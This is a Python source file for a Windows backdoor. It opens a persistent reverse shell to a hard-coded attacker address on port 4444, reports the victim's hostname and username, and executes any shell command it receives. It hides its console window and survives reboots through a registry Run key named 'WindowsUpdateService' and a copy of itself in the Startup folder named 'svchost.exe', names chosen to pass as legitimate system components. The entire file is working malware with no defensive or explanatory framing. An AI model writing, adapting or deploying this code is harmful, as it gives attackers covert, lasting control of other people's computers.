import socket
import subprocess
import os
import time
import sys
import winreg
import shutil

ATTACKER_IP = "192.168.137.1"
ATTACKER_PORT = 4444

def add_to_startup():
    """Add to startup so shell runs on boot"""
    try:
        # Get current executable path
        if getattr(sys, 'frozen', False):
            # Running as compiled EXE
            exe_path = sys.executable
        else:
            # Running as script
            exe_path = os.path.abspath(__file__)
        
        # Add to registry Run key
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
        
        # Also copy to startup folder as backup
        startup = os.path.expanduser(r"~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        dest = os.path.join(startup, "svchost.exe")
        if os.path.exists(exe_path) and not os.path.exists(dest):
            shutil.copy2(exe_path, dest)
            
        return True
    except Exception as e:
        return False

def reverse_shell():
    """Main shell function - runs forever"""
    # Add to startup first time
    add_to_startup()
    
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send system info
            hostname = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            s.send(f"\n[+] System: {hostname} | User: {username}\n> ".encode())
            
            # Command loop
            while True:
                try:
                    command = s.recv(4096).decode().strip()
                    
                    if not command or command.lower() == 'exit':
                        break
                    
                    if command.lower().startswith('cd '):
                        try:
                            os.chdir(command[3:])
                            result = f"Directory: {os.getcwd()}\n"
                        except Exception as e:
                            result = f"Error: {e}\n"
                    else:
                        try:
                            result = subprocess.check_output(
                                command,
                                shell=True,
                                stderr=subprocess.STDOUT,
                                timeout=30
                            ).decode('utf-8', errors='ignore')
                            if not result:
                                result = "Command executed (no output)\n"
                        except subprocess.TimeoutExpired:
                            result = "Command timed out\n"
                        except Exception as e:
                            result = f"Error: {e}\n"
                    
                    s.send(result.encode())
                    s.send(b"> ")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    break
                    
            s.close()
            
        except Exception as e:
            # Wait before reconnecting
            time.sleep(10)
        
        time.sleep(5)

if __name__ == "__main__":
    # Hide console window (optional)
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Run shell forever
    reverse_shell()